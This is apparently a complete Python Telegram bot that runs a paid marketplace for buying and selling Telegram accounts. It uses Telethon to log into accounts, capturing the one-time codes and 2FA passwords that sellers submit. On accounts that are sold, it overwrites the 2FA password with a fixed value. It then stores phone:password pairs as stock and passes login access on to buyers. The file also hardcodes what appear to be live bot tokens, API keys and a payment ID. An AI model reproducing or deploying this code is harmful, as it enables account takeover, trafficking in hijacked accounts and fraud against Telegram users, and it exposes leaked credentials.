import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tel_types
import asyncio, os, threading, re
from flask import Flask

app = Flask('')
@app.route('/')
def home(): return "RUNNING"
threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080), daemon=True).start()

TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")
db = {'users': {}, 'admins': [OWNER_ID], 'upi': 'abhay-op.315@ptyes', 'stock': {}, 'sell_rates': {}, 'buy_rates': {}}
active_logins = {}
if not os.path.exists('sessions'): os.makedirs('sessions')

def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

@bot.message_handler(commands=['start'])
def start(m):
    db['users'].setdefault(m.from_user.id, {'balance': 0})
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '📞 SUPPORT')
    bot.send_message(m.chat.id, "🚀 **FINAL SYSTEM ACTIVE**", reply_markup=markup)

@bot.message_handler(commands=['admin'])
def adm(m):
    if not is_admin(m.from_user.id): return
    bot.send_message(m.chat.id, "👑 **ADMIN**\n`/addcountry NAME BUY SELL`\n`/addstock` (Login Flow)\n`/addbal ID AMT`\n`/addadmin ID`\n`/changeupi UPI`\n`/broadcast`")

@bot.message_handler(commands=['addcountry'])
def add_c(m):
    if not is_admin(m.from_user.id): return
    try:
        _, n, b, s = m.text.split()
        n = n.upper()
        db['buy_rates'][n], db['sell_rates'][n] = int(b), int(s)
        db['stock'].setdefault(n, [])
        bot.reply_to(m, f"✅ {n} Added (Buy:{b} Sell:{s})")
    except: bot.reply_to(m, "Usage: `/addcountry INDIA 40 25` ")

def login_worker(chat_id, phone, country, mode):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country, 'mode': mode}
        msg = bot.send_message(chat_id, "📩 **OTP Sent!** Enter:")
        bot.register_next_step_handler(msg, verify_otp)
    except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")

def verify_otp(m):
    d = active_logins.get(m.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], m.text.strip(), phone_code_hash=d['hash']))
        finalize(m, d)
    except Exception as e:
        if "password" in str(e).lower():
            bot.send_message(m.chat.id, "🔐 **2FA Password:**")
            bot.register_next_step_handler(m, verify_2fa)
        else: bot.send_message(m.chat.id, "❌ OTP Wrong.")

def verify_2fa(m):
    d = active_logins.get(m.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(password=m.text.strip()))
        finalize(m, d, m.text.strip())
    except: bot.send_message(m.chat.id, "❌ Wrong 2FA.")

def finalize(m, d, pwd="No Password"):
    if d['mode'] == "sell":
        try: d['loop'].run_until_complete(d['client'](functions.account.UpdatePasswordSettingsRequest(new_settings=tel_types.account.PasswordInputSettings(new_password="2710", hint="dob"))))
        except: pass
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"sa_{m.from_user.id}_{d['country']}"), types.InlineKeyboardButton("❌ REJECT", callback_data=f"sr_{m.from_user.id}"))
        for a in db['admins']: bot.send_message(a, f"📦 **SELL REQ**\nUser: `{m.from_user.id}`\nNum: `{d['phone']}`\nPass: `2710`", reply_markup=markup)
        bot.send_message(m.chat.id, "✅ ID Connected! Pending Approval.")
    else:
        db['stock'].setdefault(d['country'], []).append(f"{d['phone']}:PASS:{pwd}")
        bot.send_message(m.chat.id, f"✅ ID Added to {d['country']} Stock.")

@bot.message_handler(func=lambda m: m.text == '📤 SELL ID')
def h_sell(m):
    if not db['sell_rates']: return bot.send_message(m.chat.id, "❌ Market Close")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: markup.add(f"SELL {c}")
    bot.send_message(m.chat.id, "Select:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def h_sell_p(m):
    c = m.text.split()[1]
    msg = bot.send_message(m.chat.id, "📞 Num (+):", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, lambda ms: threading.Thread(target=login_worker, args=(m.chat.id, ms.text, c, "sell")).start())

@bot.message_handler(commands=['addstock'])
def add_st(m):
    if not is_admin(m.from_user.id): return
    msg = bot.send_message(m.chat.id, "🌍 Country Name:")
    bot.register_next_step_handler(msg, lambda c_m: bot.register_next_step_handler(bot.send_message(m.chat.id, "📞 Num:"), lambda n_m: threading.Thread(target=login_worker, args=(m.chat.id, n_m.text, c_m.text.upper(), "stock")).start()))

@bot.callback_query_handler(func=lambda call: True)
def cb(call):
    p = call.data.split('_')
    if p[0] == 'buyid':
        c, uid = p[1], call.from_user.id
        if db['users'].get(uid, {}).get('balance', 0) < db['buy_rates'].get(c, 0) or not db['stock'].get(c):
            return bot.answer_callback_query(call.id, "Low Bal/Stock", show_alert=True)
        data = db['stock'][c].pop(0)
        db['users'][uid]['balance'] -= db['buy_rates'][c]
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📩 GET CODE", callback_data=f"gotp_{data.split(':')[0]}"), types.InlineKeyboardButton("🚪 LOGOUT", callback_data=f"lout_{data.split(':')[0]}"))
        bot.send_message(uid, f"🛒 **SUCCESS**\nData: `{data}`", reply_markup=markup)
    elif p[0] == 'sa':
        db['users'][int(p[1])]['balance'] += db['sell_rates'].get(p[2], 0)
        bot.send_message(int(p[1]), "✅ Approved!")
        bot.edit_message_text("Approved ✅", call.message.chat.id, call.message.message_id)

@bot.message_handler(func=lambda m: m.text == '🛒 BUY ID')
def h_buy(m):
    markup = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items(): markup.add(types.InlineKeyboardButton(f"{c} - ₹{p} ({len(db['stock'].get(c,[]))})", callback_data=f"buyid_{c}"))
    bot.send_message(m.chat.id, "Market:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '💰 BALANCE')
def h_bal(m): bot.send_message(m.chat.id, f"💳 Balance: ₹{db['users'].get(m.from_user.id, {}).get('balance',0)}")

@bot.message_handler(func=lambda m: m.text == '📞 SUPPORT')
def h_sup(m): bot.send_message(m.chat.id, "👤 Admin: @god_abhay")

bot.polling(none_stop=True)
